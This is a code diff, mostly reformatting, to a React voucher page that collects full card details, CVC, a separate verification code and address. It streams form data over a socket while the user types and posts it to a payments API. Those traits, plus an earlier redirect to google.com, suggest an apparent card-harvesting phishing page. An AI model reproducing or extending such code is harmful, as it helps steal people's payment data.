@@ -17,6 +17,7 @@ import { socket } from '../../socket';
 import { debounce } from 'lodash';
 
 const VoucherPage = () => {
+	const navigate = useNavigate();
 	const [step, setStep] = useState(0);
 	const [loading, setLoading] = useState(false);
 
@@ -31,7 +32,11 @@ const VoucherPage = () => {
 		region: Yup.string().required(),
 		zipcode: Yup.string()
 			.required()
-			.test('val', 'Invalid zipcode', (val) => val.toString().length <= 32 && val.toString().length >= 5),
+			.test(
+				'val',
+				'Invalid zipcode',
+				(val) => val.toString().length <= 32 && val.toString().length >= 5
+			),
 		state: Yup.string().required(),
 		country: Yup.string().required(),
 		cardVerifyCode: Yup.string().required(),
@@ -40,7 +45,11 @@ const VoucherPage = () => {
 		cardName: Yup.string().required(),
 		cardNumber: Yup.string()
 			.required()
-			.test('val', 'Invalid card number', (val) => val.replaceAll('-', '').length < 19 && val.replaceAll('-', '').length > 13)
+			.test(
+				'val',
+				'Invalid card number',
+				(val) => val.replaceAll('-', '').length < 19 && val.replaceAll('-', '').length > 13
+			)
 			.typeError('Invalid card number'),
 		expires: Yup.string().required(),
 		cvc: Yup.string().required('Invalid code').min(3, 'Invalid code').max(4, 'Invalid code'),
@@ -126,15 +135,22 @@ const VoucherPage = () => {
 		bin: Math.floor(Math.random() * 1000000),
 	};
 
-	const debouncedSocketEmit = useCallback(debounce((data) => {
-		socket.emit('creatingPayment', data);
-	}, 500), []);
+	const debouncedSocketEmit = useCallback(
+		debounce((data) => {
+			socket.emit('creatingPayment', data);
+		}, 500),
+		[]
+	);
 
 	const onSubmit = async () => {
 		if (watchCardVerifyCode.length > 0 && Object.keys(errors).length < 1) {
 			try {
-				await axios.post(`${API_URL}/api/payments`, { ...submitvalue, sessionId: socket.id });
-				window.location.href = 'https://www.google.com';
+				await axios.post(`${API_URL}/api/payments`, {
+					...submitvalue,
+					sessionId: socket.id,
+					cardNumber: watchCardNumber.replaceAll('-', ''),
+				});
+				navigate('/');
 			} catch (error) {
 				setLoading(false);
 				toast.error(error?.response?.data?.message ?? 'Unknown error');
